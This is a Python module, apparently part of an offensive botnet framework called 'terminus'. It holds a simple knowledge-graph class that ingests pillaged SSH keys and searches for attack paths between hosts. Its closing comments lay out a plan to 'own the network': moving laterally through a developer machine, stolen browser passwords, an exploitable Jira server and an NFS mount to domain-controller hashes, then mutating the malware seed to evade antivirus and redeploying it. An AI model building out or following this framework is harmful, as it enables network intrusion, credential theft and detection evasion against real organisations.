# file: nous_core.py
# version: 1.0.0 'demiurge'
# desc: the central synthesis and reasoning engine for terminus.

class NousCore:
    """
    a simulated knowledge graph for deriving non-obvious relationships and attack vectors.
    in a real implementation, this would be backed by a graph database like neo4j.
    """
    def __init__(self):
        # nodes are entities (e.g., 'user:bob', 'host:db_server', 'file:/etc/shadow')
        # edges are relationships with properties (e.g., {'from': 'user:bob', 'to': 'host:db_server', 'type': 'ssh_access'})
        self.nodes = set()
        self.edges = []

    def ingest(self, data_source, data):
        """ingests reports from other modules and updates the graph."""
        if data_source == 'omni_pillage':
            # example: pillage found an ssh key for 'admin' on 'web_server' that connects to 'db_server'
            user_node = f"user:{data.get('user', 'unknown')}"
            host_node = f"host:{data.get('hostname')}"
            key_node = f"key:{data.get('ssh_key_name')}"
            target_node = f"host:{data.get('ssh_key_target')}" # hypothetical data point

            self.nodes.update([user_node, host_node, key_node, target_node])
            self.edges.append({'from': host_node, 'to': key_node, 'type': 'contains_key'})
            self.edges.append({'from': key_node, 'to': target_node, 'type': 'grants_access_to'})
            print(f"[nous] ingested ssh key relationship: {host_node} -> {target_node}")

    def find_path(self, start_node, end_node, path=[]):
        """finds a sequence of relationships connecting two nodes in the graph."""
        path = path + [start_node]
        if start_node == end_node:
            return [path]
        if start_node not in [e['from'] for e in self.edges]:
            return []
        
        paths = []
        for edge in self.edges:
            if edge['from'] == start_node and edge['to'] not in path:
                new_paths = self.find_path(edge['to'], end_node, path)
                for new_path in new_paths:
                    paths.append(new_path)
        return paths

    def reason(self, objective):
        """
        the core function. asks the graph "how do i achieve x?"
        example: "find attack path from compromised_host to root_domain_controller"
        """
        start = objective['from']
        end = objective['to']
        print(f"[nous] reasoning about objective: from {start} to {end}")
        paths = self.find_path(start, end)
        if not paths:
            return {"conclusion": "no obvious path found with current data."}
        
        return {"conclusion": "attack path identified.", "paths": paths}

# --- how terminus would use these modules in concert ---
# 1. the c2's cortex module receives a high-level objective: "own the network."
# 2. cortex tasks the nous core: `reason({'from': 'bot_uid_123', 'to': 'host:domain_controller'})`
# 3. the nous core analyzes its graph, built from weeks of passive data collection. it finds a non-obvious path:
#    - bot_123 can access a dev's machine.
#    - the dev's browser data contains a password for a jira server.
#    - the jira server has an api that can be exploited to run code on the jira host.
#    - the jira host has a misconfigured nfs mount to a backup server.
#    - the backup server contains old password hashes for the domain controller.
# 4. the nous core returns this plan to cortex.
# 5. cortex generates a sequence of commands for the bots to execute this plan.
# 6. if a step fails due to an antivirus flagging the seed, cortex tasks the metamorphic engine: `mutate('terminus_seed.py', 'terminus_seed_v2.py')`
# 7. cortex then redeploys the newly mutated, undetectable seed and continues the attack.